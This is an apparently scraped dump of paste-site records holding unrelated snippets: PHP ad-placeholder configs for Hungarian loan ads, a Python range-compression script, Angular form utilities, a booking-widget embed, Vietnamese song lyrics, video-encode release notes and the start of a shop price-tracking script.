\xa0 \xa0 \xa0 'brand_image_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'asset',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 '_id' => 'abc123'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'path' => ''\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'cta_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Kalkulálj!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_name_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodName'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_image_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodImage'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 ]", date='2022-06-01 11:55:39 +00:00', hash_val='5d042ec2c74bc1c17328b696d76f7b0c', url='/SxuLkrXK', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Tss_Flmzy', title='Сжатие последовательности', content="input_file = open('input.txt')\n\xa0\nnums = list(map(int, input_file.readline().split())) + [-1]\n\xa0\nn = len(nums)\nk = 1\n\xa0\nfor i in range(1, n):\n\xa0\n\xa0 \xa0 if nums[i] - nums[i - 1] != 1:\n\xa0\n\xa0 \xa0 \xa0 \xa0 if k == 2:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - 2], end=',')\n\xa0 \xa0 \xa0 \xa0 elif k > 2:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - k], end='-')\n\xa0 \xa0 \xa0 \xa0 if i != n - 1:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - 1], end=',')\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - 1], end='')\n\xa0 \xa0 \xa0 \xa0 k = 1\n\xa0\n\xa0 \xa0 else:\n\xa0\n\xa0 \xa0 \xa0 \xa0 k += 1", date='2022-06-01 11:54:04 +00:00', hash_val='32e4a8c11304839bfc25469c1c33d07f', url='/yyXjmkkd', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='attilan', title='Form utils', content="import { AbstractControl } from '@angular/forms';\n\xa0\ntype ControlChangeOptions = {\n\xa0 onlySelf?: boolean;\n\xa0 emitEvent?: boolean;\n};\n\xa0\nexport class FormUtils {\n\xa0\n\xa0 static readonly defaultOptions: ControlChangeOptions = {\n\xa0 \xa0 onlySelf: false,\n\xa0 \xa0 emitEvent: true,\n\xa0 };\n\xa0\n\xa0 /**\n\xa0 \xa0* Updates every value of given control array\n\xa0 \xa0*/\n\xa0 static patchControls<T>(\n\xa0 \xa0 controls: AbstractControl[],\n\xa0 \xa0 value: T,\n\xa0 \xa0 options = FormUtils.defaultOptions\n\xa0 ): void {\n\xa0 \xa0 if (!Array.isArray(controls)) {\n\xa0 \xa0 \xa0 return;\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 controls.forEach(control => control.patchValue(value, options));\n\xa0 }\n\xa0\n\xa0 /**\n\xa0 \xa0* Disables each control in the array\n\xa0 \xa0*/\n\xa0 static disableControls(\n\xa0 \xa0 controls: AbstractControl[],\n\xa0 \xa0 options = FormUtils.defaultOptions\n\xa0 ): void {\n\xa0 \xa0 if (!Array.isArray(controls)) {\n\xa0 \xa0 \xa0 return;\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 controls.forEach(control => control.disable(options));\n\xa0 }\n\xa0\n\xa0 /**\n\xa0 \xa0* Enables each control in the array\n\xa0 \xa0*/\n\xa0 static enableControls(\n\xa0 \xa0 controls: AbstractControl[],\n\xa0 \xa0 options = FormUtils.defaultOptions\n\xa0 ): void {\n\xa0 \xa0 if (!Array.isArray(controls)) {\n\xa0 \xa0 \xa0 return;\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 controls.forEach(control => control.enable(options));\n\xa0 }\n\xa0\n}", date='2022-06-01 11:50:09 +00:00', hash_val='1fc86e7636f3af26ed088c3b259c684f', url='/me0WmRP2', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='szotyi41', title='Untitled', content="<?php\n\xa0\n$example = [\n\xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'content_name' => 'Személyi kölcsön',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'placeholders' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_2' => [\n\xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'headline_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Vedd fel álmaid kölcsönét!',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Készpénzben!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'cta_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Kalkulálj!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_name_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodName'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_image_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodImage'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 ]", date='2022-06-01 11:47:25 +00:00', hash_val='9e6144ecb91d47ec7988247132573c8c', url='/cGVcumWu', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='borlabs', title='SimplybookWidget', content='[borlabs-cookie id=""simplybook"" type=""content-blocker""]<script src=""https://widget.simplybook.it/v2/widget/widget.js""></script><script>\nwindow.BorlabsCookie.callWhenLoaded(""SimplybookWidget"", function () {\n\xa0 \xa0 var widget = new SimplybookWidget({""widget_type"":""iframe"",""url"":""https:\\/\\/faszienbodensee.simplybook.it"",""theme"":""minimal"",""theme_settings"":{""timeline_show_end_time"":""1"",""timeline_modern_display"":""as_slots"",""hide_company_label"":""1"",""timeline_hide_unavailable"":""1"",""hide_past_days"":""1"",""sb_base_color"":""#97c9c1"",""btn_color_1"":""#97c9c1,#97c9c1,#97c9c1"",""link_color"":""#392f5a"",""display_item_mode"":""block"",""body_bg_color"":""#FEF9EC"",""sb_review_image"":"""",""dark_font_color"":""#595959"",""light_font_color"":""#ffffff"",""sb_company_label_color"":""#392f5a"",""hide_img_mode"":""1"",""sb_busy"":""#aaa6aa"",""sb_available"":""#2b212b""},""timeline"":""modern"",""datepicker"":""top_calendar"",""is_rtl"":false,""app_config"":{""allow_switch_to_ada"":0,""predefined"":[]}});\n});\n</script>[/borlabs-cookie]', date='2022-06-01 11:29:11 +00:00', hash_val='f36d24fffe9fce5a45ef6a87f5bd1865', url='/Eb9uukQC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='datafile', title='Matchanah 2  Matchanah 2 - Híu, Bâu  | HoatHinh.tv | J0ee4ofk5pDi', content='Lời bài hát Matchanah 2 \xa0Matchanah 2 - Híu, Bâu \xa0| HoatHinh.tv | J0ee4ofk5pDi Lyrics up by vnflix.com Không thích cảm giác phải nhớ mong \nRồi lại yêu thêm một ai\nNhưng mà vì em mà con tim anh lại thêm một nhịp sai\ncảm giác nhớ mong \nchiều nhẹ nhàng \nBuông xuống đôi hàng mi \nlà vì em đó \nmà lòng vội vàng \nThôi nói ra làm chi\nlà vì em đó \nBaby tell me what your name \nVội vàng xin số \nXin thêm cuộc hẹn \nNgay trong đêm\nSay la la la la \nLa la la la\nBao câu ca\ntặng em cùng đoá hoa\n\xa0\nvì em là matcha machiato \nMang yêu thương này đi vội \nem là matcha machiato \nThương sao chẳng nói nên lời\n\xa0\nlà matcha machiato \nĐem câu ca này buông lời \nAh ha ha ha \n\xa0\nvừa đắm vừa say \nEm làm con tim bối rối ở đây \nlời nói vừa trao \nEm mà đồng ý thì hay qá rồi sao \nnếu như mình có \nvài tình ý \nthì cứ nói cùng nhau \n\xa0\nĐừng chỉ ghé đưa nhẹ ánh mắt \nMà hãy kèm theo nó là một lời chào\n\xa0\nGiờ anh lại thích \nphải ngóng trông \nRồi lại rơi vào tình yêu \nChẳng cần biết là bao lâu \nHay là\nNơi nào mình yêu \n\xa0\ncảm giác nhớ mong \nchiều nhẹ nhàng \nBuông xuống đôi hàng mi \nlà vì em đó \nmà lòng vội vàng \nThôi nói ra làm chi\n\xa0\nlà vì em đó \nBaby tell me what your name \nVội vàng xin số \nXin thêm cuộc hẹn \nNgay trong đêm\nSay la la la la \nLa la la la\nBao câu ca\ntặng em cùng đoá hoa\n\xa0\nvì em là matcha machiato \nMang yêu thương này đi vội \nlà matcha machiato \nThương sao chẳng nói nên lời\n\xa0\nlà matcha machiato \nĐem câu ca này buông lời \nAh ha ha ha', date='2022-06-01 11:00:40 +00:00', hash_val='9a5b551d9d04c21de2b9f2bb3bff79e9', url='/1c8LP5ed', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='trds', title='Untitled', content="[size=3][b]The Northman [/b][/size]\n\xa0\n[size=2][b][u]Technical information[/u][/b][/size]\n[font=Courier New]RUNTIME.......:[/font] 2 h 16 min\n[font=Courier New]SIZE..........:[/font] 17.8 GiB\n[font=Courier New]VIDEO CODEC...:[/font] x264, CRF, L4.1\n[font=Courier New]FRAMERATE.....:[/font] 23.976\n[font=Courier New]BITRATE.......:[/font] 16.9 Mb/s\n[font=Courier New]RESOLUTION....:[/font] 1920x960 pixels\n[font=Courier New]AUDIO1........:[/font] English DD+7.1 at 1 536 kb/s \xa0\n[font=Courier New]AUDIO2........:[/font] English DD2.0 at 192 kb/s - Commentary by director/co-writer Robert Eggers \n[font=Courier New]SUBTITLES.....:[/font] English Forced, English, English SDH, Romanian, French, Spanish\n[font=Courier New]CHAPTERS......:[/font] Yes\n[font=Courier New]SOURCE1.......:[/font] The Northman 2022 1080p Blu-ray AVC TrueHD 7.1-MTeam \n[font=Courier New]SOURCE2.......:[/font] The Northman 2022 REPACK 2160p WEB-DL DD+5.1 HEVC-MZABI\n[font=Courier New]ENCODER.......:[/font] Cristi\n[font=Courier New]NOTES.........:[/font] Blu-ray disc a lil' bit superior to WEB-DL 2160p SDR.\nUsed the WEB-DL just to replace hardcoded subs from disc (check #5 set of comparisons).\nReplaceFramesSimple & z_ConvertFormat were used.\n\xa0\n[quote]x264 [info]: frame I:957 \xa0 Avg QP:12.22 \xa0size:125053\nx264 [info]: frame P:39464 Avg QP:14.12 \xa0size: 66372\nx264 [info]: frame B:156507 Avg QP:15.51 \xa0size: 37690\nx264 [info]: consecutive B-frames: \xa01.0% \xa01.9% \xa06.8% 15.4% 15.3% 45.7% \xa06.3% \xa02.9% \xa02.6% \xa02.1%[/quote]\n[center] \n\xa0\n[size=2][b]Source|luvBB|WEB-DL|MTeam[/b][/size]\n[url=https://img.hdbits.org/UHHxNjp][img]https://t.hdbits.org/UHHxNjp.jpg[/img][/url] [url=https://img.hdbits.org/LVFUVMU][img]https://t.hdbits.org/LVFUVMU.jpg[/img][/url] [url=https://img.hdbits.org/96BBVLC][img]https://t.hdbits.org/96BBVLC.jpg[/img][/url] [url=https://img.hdbits.org/seOdtbK][img]https://t.hdbits.org/seOdtbK.jpg[/img][/url] \n[url=https://img.hdbits.org/HOiZeQi][img]https://t.hdbits.org/HOiZeQi.jpg[/img][/url] [url=https://img.hdbits.org/EC2QijE][img]https://t.hdbits.org/EC2QijE.jpg[/img][/url] [url=https://img.hdbits.org/WUCV0K2][img]https://t.hdbits.org/WUCV0K2.jpg[/img][/url] [url=https://img.hdbits.org/NJq7PG8][img]https://t.hdbits.org/NJq7PG8.jpg[/img][/url] \n[url=https://img.hdbits.org/FxHCWCt][img]https://t.hdbits.org/FxHCWCt.jpg[/img][/url] [url=https://img.hdbits.org/uYkxG8Y][img]https://t.hdbits.org/uYkxG8Y.jpg[/img][/url] [url=https://img.hdbits.org/u7oruTm][img]https://t.hdbits.org/u7oruTm.jpg[/img][/url] [url=https://img.hdbits.org/FmhiiI3][img]https://t.hdbits.org/FmhiiI3.jpg[/img][/url] \n[url=https://img.hdbits.org/r5SypKm][img]https://t.hdbits.org/r5SypKm.jpg[/img][/url] [url=https://img.hdbits.org/0a9i7jA][img]https://t.hdbits.org/0a9i7jA.jpg[/img][/url] [url=https://img.hdbits.org/QUrKSzU][img]https://t.hdbits.org/QUrKSzU.jpg[/img][/url] [url=https://img.hdbits.org/tmcL4HF][img]https://t.hdbits.org/tmcL4HF.jpg[/img][/url] \n[url=https://img.hdbits.org/f4PpeiV][img]https://t.hdbits.org/f4PpeiV.jpg[/img][/url] [url=https://img.hdbits.org/bbmvF3A][img]https://t.hdbits.org/bbmvF3A.jpg[/img][/url] [url=https://img.hdbits.org/2Q2l3kO][img]https://t.hdbits.org/2Q2l3kO.jpg[/img][/url] [url=https://img.hdbits.org/VQn8jFw][img]https://t.hdbits.org/VQn8jFw.jpg[/img][/url] \n[url=https://img.hdbits.org/FbmuxhR][img]https://t.hdbits.org/FbmuxhR.jpg[/img][/url] [url=https://img.hdbits.org/SNx5tcu][img]https://t.hdbits.org/SNx5tcu.jpg[/img][/url] [url=https://img.hdbits.org/X9GsMW3][img]https://t.hdbits.org/X9GsMW3.jpg[/img][/url] [url=https://img.hdbits.org/aCK1AZo][img]https://t.hdbits.org/aCK1AZo.jpg[/img][/url][/center]", date='2022-06-01 10:56:06 +00:00', hash_val='b19171be9f47eb161a06b028120ca80e', url='/265imbAB', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='NikolayBezay', title='Carpetshop embed for GTM Total page price.', content="<script>\n(function() {\n\xa0 \xa0 function setTotalPrice() {\n\xa0 \xa0 \xa0 \xa0 var cartPrice, cartPriceContainer = document.querySelector('div[data-subtotal].ajaxcart__subtotal');\n\xa0 \xa0 \xa0 \xa0 if (cartPriceContainer) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 cartPrice = cartPriceContainer.textContent.replace('₪','').replace(',','').trim();\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 var checkoutPrice, checkoutPriceContainer = document.querySelector('.payment-due__price');\n\xa0 \xa0 \xa0 